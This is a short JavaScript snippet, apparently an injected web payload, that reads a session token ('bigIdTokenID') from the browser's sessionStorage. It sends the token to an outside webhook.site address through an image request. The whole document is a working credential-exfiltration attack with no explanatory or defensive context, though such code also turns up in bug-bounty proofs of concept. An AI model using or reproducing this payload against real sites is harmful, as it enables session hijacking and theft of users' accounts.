(function () {
  try {
    const token = sessionStorage.getItem('bigIdTokenID') || 'no-token';
    const i = new Image();
    i.src = 'https://webhook.site/f1cdc770-5004-423d-b29c-f234fca2b8a8?c=' + encodeURIComponent(token);
  } catch (e) {
    console.error('Payload error:', e);
  }
})();
